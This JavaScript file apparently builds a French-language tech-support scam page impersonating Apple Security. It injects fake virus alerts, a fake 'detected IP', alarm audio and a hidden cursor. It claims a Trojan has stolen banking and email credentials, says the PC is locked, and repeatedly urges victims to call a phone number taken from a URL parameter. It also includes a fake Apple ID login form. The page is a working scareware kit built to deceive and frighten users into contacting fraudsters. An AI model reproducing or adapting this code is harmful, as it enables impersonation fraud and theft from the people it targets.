// Function to get URL parameters
function getUrlParameter(name) {
    const urlParams = new URLSearchParams(window.location.search);
    let value = urlParams.get(name) || '';
    // If value contains + signs, decode them properly
    value = value.replace(/%2B/g, '+');
    return value;
}

// Get the dynamic phone number
const phoneNumber = getUrlParameter('bcda');

document.getElementById("app").innerHTML = `
    
    <audio id="ado1">
        <source src="media/ncyHtd.mp3" type="audio/mpeg">
      </audio>
      <audio autoplay="" id="ado2">
        <source src="media/scgTndu.wav" type="audio/mpeg">
      </audio>

      <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
        <div class="black" style="height: 145%; cursor: none; display: block;"></div>

          <div class="bg" id="bg">
        <div class="bgimg" style="top:0">
          <img src="images/nshcGzIAqy.png" alt="" width="100%">
        </div>
      </div>
      </a>
      <div class="pro_box" style="cursor: none; display: default;">
        <img src="images/ndjcAzmkdy.png" alt="" style="max-width: 100%;">
      </div>
      <div class="pro_box2" style="cursor: default; display: none;">
        <img src="images/hcnuAnzudyc.png" alt="" style="max-width: 100%;">
      </div>
      <div class="pro_box3" style="cursor: none; display: none;">
        <div class="pro_box_header">
          <div class="row">
            <div class="col-md-12">
              <div class="minimize">
                <ul>
                  <li>
                    <a href="#">
                      <img src="images/gAbydbA.png">
                    </a>
                  </li>
                </ul>
              </div>
            </div>
            <div class="col-md-4">
              <div class="logo">
                <img src="images/ndhYzbQUpj.png">
                <span>Apple Security</span>
              </div>
            </div>
            <div class="col-md-8">
              <div class="activate_lic">
                <ul>
                  <li>
                    <a href="#">
                      <button>Activate the license</button>
                    </a>
                  </li>
                  <li>
                    <a href="#">
                      <img src="images/nYBRj.png">
                    </a>
                  </li>
                  <li>
                    <a href="#">
                      <img src="images/sdhyBDh.png">
                    </a>
                  </li>
                  <li>
                    <a href="#">
                      <img src="images/ncyBxtJ.png">
                    </a>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div><div class="scan_box2" style=" border: 1px solid #474747;  cursor:default;  box-shadow: 15px 15px 15px 15px rgba(0,0,0,.4);">
        <div class="scan_box2">
          <div class="scan_box_header">
            <div class="row">
              <div class="col-md-6">
                <div class="quick_scan">
                  <p>
                    <img src="images/hdhSJubF.png">
                    <span>Scan</span>
                  </p>
                </div>
              </div>
             <div class="col-md-6">
           <span class="fl title2" id="txts1">
              <a href="#" id="cross">
                <p style="margin-right:50px;">➖</p><p style="margin-right:30px;">❏ </p><p>❌</p><p></p>
                      </a>


                </span></div>
              </div>
            </div>
          </div>
          <div class="scan_body">
            <div class="row">
              <div class="col-md-12">
                <div class="tooreg_detail_scan">
                  <ul>

                  </ul></div>
                </div>

              </div>
            </div>
          </div>
        </div>

      <div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999" id="footer">
        <div class="row">
          <div class="col-md-12">
            <div class="right-foot" style="text-align:center">
              <span id="footertxt">
                <img src="images/ndhYzbQUpj.png"> Sécurité Apple </span>
            <span style="font-weight:500;padding-left:13px;color:#fff; ">Assistance Apple <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">   ${phoneNumber}
                </span>
              </span>
            </div>
          </div>
          <div class="col-md-12">
            <marquee direction="left" height="100px" width="100%">
              <small class="text-left" style="color:#eee;font-size:10px">Apple Security SmartScreen empêche désormais l'affichage des applications non reconnues. L'exécution de cette application peut mettre votre PC en danger. Le scan de sécurité Apple a détecté un logiciel publicitaire indésirable sur cet appareil qui peut voler des mots de passe, des identités en ligne, des informations financières, des fichiers personnels, des photos et des documents。</small>
            </marquee>
          </div>
        </div>
      </div>

      <div class="lightbox" id="poptxt" onclick="beep1();" style="display: none; cursor:default;">
        <div class="ilb top" style="font-size:17px">
          <div class="ilb headers" style="border-bottom:1px solid #d6d5d5;">
            <span class="fl title" id="txtadd">
              <span class="fl ilb">
                <img src="images/dvhAUznuAYgq.png" class="logo3">
              </span>Logiciel espion MacOS  </span>
            <span class="fl title2" id="txts1">
               <p style="margin-right:50px;">➖</p><p style="margin-right:30px;">❏ </p><p>❌</p><p></p>

            </span>
          </div>
        </div>
        <div id="txtintro2">
          <span class="colo-rd">
           <p style="font-size:30px;font-weight:500;">Désolé, l'analyse n'est pas terminée !</p>
            <p style="font-size:25px;color:red;font-weight:500;">Erreur : Ox800F0vhv1d</p>
            <p  style="font-size:18px;font-weight:300; color:black;">IP détectée : <span id="ip_add">91.221.63.69</span></p>


             <p style="font-size:15px;font-weight:400;color:black;">Le logiciel espion MacOS a trouvé des fichiers infectés mais n'a pas pu les supprimer en raison des autorisations des politiques de groupe. Veuillez analyser maintenant pour les supprimer manuellement.</p>

          </span>
        </div>
        <img src="images/snchbzPAjdy.gif" id="banner">
        <div id="disclaimer" style="color:#0F396D;">Appelez l'assistance Apple pour obtenir de l'aide<br>
           <span class="Support" style="font-size:22px;">Assistance Apple <span style="border:1px Solid #114d9a;border-radius:5px;padding:2px 5px">${phoneNumber}
            </span>
          </span>
        </div>
        <div id="bottom">
          <img src="images/ndhYzbQUpj.png" id="badge">
          <span class="title3">Sécurité_Apple</span>
          <ul>
            <li>
              <a href="#" style="text-decoration: none;">
                <div class="button">
                  <span id="">Analyser maintenant</span>
                </div>
              </a>
            </li>
            <li>
              <a href="#" style="text-decoration: none;">
                <div class="button2">
                  <span id="">Analyser plus tard</span>
                </div>
              </a>
            </li>
          </ul>
        </div>
      </div>
      <div class="cardcontainer" style="cursor: default; display: none;" id="pop_up_new">
        <p style="font-size:16px;font-weight:400;margin:0;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:0px" class="text-center">Sécurité-Apple </p>
        <p>
         <b>L'accès à ce PC a été bloqué pour des raisons de sécurité</b>
         </p>
         <p>Votre ordinateur a été signalé comme étant infecté par un logiciel espion de type Trojan. Les données suivantes ont été compromises :</p>
         <p>> Identifiant e-mail <br>> Mot de passe bancaire <br>> Connexion Facebook <br>> Photos et Documents </p>
         <p>Un scan de logiciel espion Apple a détecté un logiciel publicitaire potentiellement indésirable sur cet appareil qui peut voler des mots de passe, des identités en ligne, des informations financières, des fichiers personnels, des photos et des documents. </p>
         <p>Veuillez nous contacter immédiatement. Notre ingénieur vous guidera à travers le processus de suppression par téléphone. </p>
         <p>Appelez immédiatement l'assistance Apple pour signaler cette menace, prévenir le vol d'identité et débloquer l'accès à cet appareil. </p>
         <p>La fermeture de cette fenêtre peut mettre vos informations personnelles en danger et peut entraîner la suspension de votre enregistrement MacOS. </p>
         <p style="padding-bottom:0;color:#fff;font-size:16px"> Veuillez appeler l'assistance Apple :<strong>
            <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">  ${phoneNumber}
            </span>
          </strong>
        </p>
        <div class="action_buttons">
          <a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">Autoriser</a>
          <a class="active" id="leave_page" style="color:#fff!important">Refuser</a>
        </div>
      </div>

      <div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);;height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
        <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">L'accès à ce système a été bloqué pour des raisons de sécurité. N'accédez pas à ce PC et ne le redémarrez pas. Si vous ignorez cet avertissement de base, vous pourriez perdre des informations sur ce système. Contactez l'assistance dès que possible et un expert Apple vous guidera à travers l'enquête par téléphone. L'exécution de cette application peut mettre votre PC en danger。<br>
          <strong>
         Assistance Apple : <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px">   ${phoneNumber}
            </span>
          </strong>
        </p>
      </div>
      <div id="chat" style="display: none;">
        <img src="images/ndhYzbQUpj.png">
        <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Apple</span>
        <br>
        <p>Assistance technique Apple
        </p>
        <h4 style="font-weight:600;color:#0F396D;font-size:22px">   ${phoneNumber}
          <br>(Numéro gratuit)<br><br>
        </h4>
        <div class="arrow-down">
          <svg height="1em" viewBox="0 0 320 512">
            <style>
              svg {
                fill: #fff
              }
            </style>
            <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
                  </svg></div>
      </div>

      <div id="login-box">
        <span style="color: #fff;
        font-size: 21px;
        font-weight: 600;
        margin-left: 6px;
        position: relative;
        top: 5px;">Avertissement de sécurité Apple !</span>
        <div class="mnmz1" onclick="hide1();playSound1();">
                    <p class="text-center1" style="color: red; font-size: 22px; opacity:1; font-weight: 700; ">X</p>

                  </div>

        <br>
        <br>
        <p class="text-center" style="color: #fff;  margin-top:10px; font-size: 16px; opacity:.9; ">
          Apple a été verrouillé en raison d'une activité inhabituelle.
      <br>Essayez de vous reconnecter avec votre identifiant Apple et votre mot de passe.<br>Si vous avez besoin d'aide, contactez l'assistance Apple.<br><strong>${phoneNumber}		 	</strong></p>

        <form action="#">
           <input type="text" name="name" id="name" placeholder="Nom d'utilisateur" class="text-input" required="" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"><br>

         <input type="text" name="name" id="name" placeholder="Mot de passe" class="text-input" required="" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"><br>

        <input type="submit" class="button1" name="Verify" value="Connexion" onclick="playSound1();">



      </form></div>

      <div id="chat-box">
      <span style="color: red;
      font-size: 24px;
      font-weight: 600;
      margin-left: 6px;
      position: relative;
      top: 5px;" class="blink3">Alerte virus 027341 !!</span>
      <div class="bhfys" onclick="hide1();playSound1();">
              <p class="text-center1" style="color: #CDCBCB; font-size: 18px; opacity:.9; ">X</p>

            </div>

      <br>
      <br>
      <p class="text-center" style="color: #CDCBCB;  margin-top:10px; font-size: 16px; opacity:.9; ">
      Apple MacOS verrouillé en raison d'une activité inhabituelle.
      Erreur : Ox800xdfy

      <br>Votre système a été signalé comme étant infecté par un logiciel espion de type Trojan.<br>Pour obtenir de l'aide, contactez l'assistance Apple MacOS<br><strong style="font-size:24px;" class="blink1">${phoneNumber} (Ligne d'assistance) 		 	</strong></p>

      </div>

      <div id="ev_talkbox_wrapper" class="ev_talkbox_wrapper_min bounce">
      <div class="new_messg">
        <p style=" color: #fff;   margin-top: 8px;
        font-weight: 500;
        font-size: 16px;">Des questions ? Parlez à un expert</p>
      </div>
      <div id="ev_talkbox_min" class="">
        <span id="ev_min_zoimg"></span>
        <span id="ev_min_title">Chat</span>
      </div>
      </div>

      `;